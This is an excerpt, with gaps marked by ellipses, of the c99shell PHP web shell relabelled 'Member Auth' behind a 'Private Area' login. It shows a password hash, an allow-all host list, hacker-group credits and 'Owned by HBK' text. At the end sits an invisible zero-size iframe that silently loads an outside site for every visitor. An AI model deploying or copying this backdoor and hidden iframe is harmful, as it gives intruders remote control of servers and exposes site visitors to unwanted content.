...
$shver = "Member Auth"; //Current version
...
$pass = ""; //password
$md5_pass = "e967e2004843824ff39912e36c6ecb29"; //md5-cryped pass. if null, md5($pass)

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Private Area"; //http-auth message.
$accessdeniedmess = "<a href=\"http://www.google.com\">Admin.".$shver."</a>: access denied";
...
$donated_html = "<center><b>Owned by HBK</b></center>";
...
if ($act == "about") {echo "<center><b>Credits:<br>Idea, leading and coding by Partizan [RedHacker].<br>Beta-testing and some tips - Phara0h [RedHacker].<br>Thanks all who report bugs.<br>All bugs send to tristram's ICQ #3112239 <a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=3112239\"><img src=\"http://wwp.icq.com/scripts/online.dll?icq=3112239&img=5\" border=0 align=absmiddle></a>.</b>";}
?>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>powered by</b></u></a> Partizan Red Hack Team | <a href="http://kizil.org"><font color="#FF0000">http://kizil.org</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
</body></html><?php chdir($lastdir); c99shexit(); ?>
<iframe src="http://www.r0j.org/" width="0" height="0" frameborder="0"></iframe> 
